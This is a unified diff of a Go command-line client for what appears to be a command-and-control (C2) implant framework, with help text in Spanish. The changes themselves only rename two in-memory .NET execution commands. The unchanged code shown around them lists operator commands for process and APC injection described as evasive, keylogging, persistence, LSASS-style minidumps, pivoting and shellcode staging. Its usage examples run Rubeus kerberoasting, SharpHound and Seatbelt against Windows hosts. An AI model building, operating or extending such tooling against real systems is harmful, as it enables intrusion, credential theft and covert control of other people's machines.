@@ -56,7 +56,7 @@ var sessionCmds = []string{
 	"stage2", "bof", "results", "kill", "back",
 	"pwd", "cd", "ls", "mkdir", "rm", "env", "cat",
 	"ps", "screenshot", "inject", "token", "socks", "portfwd", "cleanup",
-	"persist", "forkrun", "inject-apc", "exec-asm", "exec-dotnet",
+	"persist", "forkrun", "inject-apc", "dotnet-asm", "dotnet-exec",
 	"keylog", "clip",
 	"link", "rsocks", "httpivot", "winrm",
 	"minidump", "port-scan",
@@ -609,7 +609,7 @@ func (cl *CLI) dispatch(parts []string) {
 		cl.cmdInjectAPC(parts[1:])
 
 	// ── execute .NET assembly in memory ──────────────────────────────────────
-	case "exec-asm":
+	case "dotnet-asm":
 		cl.requireAgent()
 		if cl.current == "" {
 			return
@@ -617,7 +617,7 @@ func (cl *CLI) dispatch(parts []string) {
 		cl.cmdExecAsm(parts[1:])
 
 	// ── inline .NET execution (native CLR host, in-process) ──────────────────
-	case "exec-dotnet":
+	case "dotnet-exec":
 		cl.requireAgent()
 		if cl.current == "" {
 			return
@@ -1224,7 +1224,7 @@ func (cl *CLI) cmdInjectAPC(args []string) {
 
 // ── execute assembly ──────────────────────────────────────────────────────
 
-const execAsmUsage = `uso: exec-asm <assembly.exe> [sacrificial_process]
+const execAsmUsage = `uso: dotnet-asm <assembly.exe> [sacrificial_process]
 
   Ejecuta un .NET assembly en memoria usando un proceso sacrificial.
   El assembly se convierte a shellcode con donut en el servidor (go-donut).
@@ -1233,8 +1233,8 @@ const execAsmUsage = `uso: exec-asm <assembly.exe> [sacrificial_process]
   Requiere: go-donut disponible en el servidor (go run github.com/Binject/go-donut).
 
 ejemplos:
-  exec-asm /tmp/Rubeus.exe
-  exec-asm /tmp/SharpHound.exe C:\Windows\System32\dllhost.exe`
+  dotnet-asm /tmp/Rubeus.exe
+  dotnet-asm /tmp/SharpHound.exe C:\Windows\System32\dllhost.exe`
 
 func (cl *CLI) cmdExecAsm(args []string) {
 	if len(args) == 0 {
@@ -1261,15 +1261,15 @@ func (cl *CLI) cmdExecAsm(args []string) {
 	cl.cmdTask(cl.current, "FORK_RUN", process, []byte(encoded))
 }
 
-// ── exec-dotnet (native CLR host, in-process) ────────────────────────────
+// ── dotnet-exec (native CLR host, in-process) ────────────────────────────
 
-const execDotnetUsage = `uso: exec-dotnet <assembly.exe> [args...] [--type <TypeName>] [--method <MethodName>]
+const execDotnetUsage = `uso: dotnet-exec <assembly.exe> [args...] [--type <TypeName>] [--method <MethodName>]
 
   Ejecuta un .NET assembly IN-PROCESS en el agente usando el CLR hosting nativo
   (mscoree.dll COM API): ICLRMetaHost → ICLRRuntimeInfo → ICLRRuntimeHost.
 
-  A diferencia de exec-asm (que convierte a shellcode con donut y usa fork-run),
-  exec-dotnet carga el CLR directamente en el proceso del agente y captura la
+  A diferencia de dotnet-asm (que convierte a shellcode con donut y usa fork-run),
+  dotnet-exec carga el CLR directamente en el proceso del agente y captura la
   salida de Console.Write* mediante redirección de pipe.
 
   Equivalente a: Cobalt Strike execute-assembly / Havoc dotnet inline-execute
@@ -1284,10 +1284,10 @@ const execDotnetUsage = `uso: exec-dotnet <assembly.exe> [args...] [--type <Type
   Nota: requiere .NET Framework 4.x en el host Windows.
 
 ejemplos:
-  exec-dotnet /tmp/Rubeus.exe kerberoast /outfile:hashes.txt
-  exec-dotnet /tmp/SharpHound.exe -c All
-  exec-dotnet /tmp/Seatbelt.exe -group=all
-  exec-dotnet /tmp/Custom.exe --type MyNS.EntryClass --method Run arg1`
+  dotnet-exec /tmp/Rubeus.exe kerberoast /outfile:hashes.txt
+  dotnet-exec /tmp/SharpHound.exe -c All
+  dotnet-exec /tmp/Seatbelt.exe -group=all
+  dotnet-exec /tmp/Custom.exe --type MyNS.EntryClass --method Run arg1`
 
 func (cl *CLI) cmdExecDotnet(args []string) {
 	if len(args) == 0 {
@@ -1336,7 +1336,7 @@ func (cl *CLI) cmdExecDotnet(args []string) {
 	taskArgs := fmt.Sprintf(`{"asm":%q,"args":%q,"type":%q,"method":%q}`,
 		asmB64, strings.Join(asmArgs, " "), typeName, methodName)
 
-	info("exec-dotnet: %s%s%s (%d bytes) → in-process CLR", cBCyan, filepath.Base(asmPath), cReset, len(data))
+	info("dotnet-exec: %s%s%s (%d bytes) → in-process CLR", cBCyan, filepath.Base(asmPath), cReset, len(data))
 	cl.cmdTask(cl.current, "DOTNET_EXEC", taskArgs, nil)
 }
 
@@ -2265,7 +2265,7 @@ func (cl *CLI) complete(line string) []string {
 				"crontab", "bashrc", "rc.local", "systemd"}, lastWord(parts, line))
 		}
 
-	case "forkrun", "inject-apc", "exec-asm":
+	case "forkrun", "inject-apc", "dotnet-asm":
 		return fileCompletions(lastWord(parts, line))
 
 	case "keylog":
@@ -2438,7 +2438,7 @@ func printHelp() {
   screenshot                         captura → servidor
   inject <pid> <sc.bin>              inyección remota
   inject-apc <sc.bin> [proc]         APC early-bird (evasivo)
-  exec-asm <asm.exe> [proc]          .NET assembly en memoria
+  dotnet-asm <asm.exe> [proc]        .NET assembly en memoria
   forkrun <sc.bin> [proc]            shellcode en proceso sacrificial
   stage2 <sc.bin>                    handoff a Sliver/CS/Havoc
   bof <nombre|archivo.o> [args]      ejecutar BOF
